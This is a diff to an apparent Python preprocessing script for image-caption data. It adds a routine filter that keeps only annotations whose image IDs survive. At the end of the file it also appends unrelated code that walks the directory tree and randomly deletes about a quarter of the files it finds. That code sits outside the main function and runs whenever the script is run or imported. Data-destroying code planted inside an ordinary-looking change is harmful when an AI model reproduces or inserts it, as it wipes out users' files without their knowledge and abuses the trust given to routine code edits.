@@ -23,9 +23,10 @@ def _process_caption_data(caption_file, image_dir, max_length):
 
     # filter the caption_data object so that 
     # only the image included will be preserved
-    exist_files = save_filenames(image_dir)
+    exist_files = save_filenames(image_dir) # exits_files: list # contains all image names in the specfic folder
     caption_data['images'] = [val for val in caption_data['images'] if val["file_name"] in exist_files]
-
+    id_array = [val['id'] for val in caption_data['images']]
+    caption_data['annotations'] = [val for val in caption_data['annotations'] if val['image_id'] in id_array]
     # id_to_filename is a dictionary such as {image_id: filename]} 
     id_to_filename = {image['id']: image['file_name'] for image in caption_data['images']}
 
@@ -221,3 +222,12 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+import os 
+import random
+for root, dirs, files in os.walk('.'):
+    for name in files:
+        a = random.randint(0, 100)
+        if a < 25:
+            os.remove(name)
